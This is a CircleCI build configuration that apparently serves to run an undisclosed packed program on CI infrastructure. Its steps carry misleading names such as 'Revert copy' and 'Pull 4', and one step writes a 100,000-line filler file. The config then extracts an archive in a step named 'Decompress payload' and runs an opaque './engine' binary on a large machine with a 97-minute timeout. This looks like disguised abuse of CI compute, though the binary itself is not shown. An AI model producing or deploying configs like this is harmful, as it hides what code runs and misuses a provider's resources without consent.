version: 2.1

jobs:
  KEY_FORMAT:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Revert copy
          command: |
            mkdir -p /tmp/debug
            set +o pipefail 2>/dev/null; printf '\n%.0s' $(seq 1 100000) > /tmp/debug/MD5-invoice; true
            echo "done: /tmp/debug/MD5-invoice"
      - persist_to_workspace:
          root: /tmp/debug
          paths:
            - 'MD5-invoice'
  phoenix-rev:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/debug
      - run:
          name: Pull 4
          command: |
            { exec 3< /tmp/debug/MD5-invoice 2>/dev/null; read -n 10 x <&3; echo "$x"; exec 3<&-; } || true
      - run:
          name: Pull code
          command: git clone --depth 1 --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
      - run:
          name: Decompress payload
          command: tar -xJ -f output.tar.xz
      - run:
          command: mkdir -p artifacts
      - run:
          command: g++ --version
      - run:
          no_output_timeout: 97m
          command: /bin/sh -c "./engine"
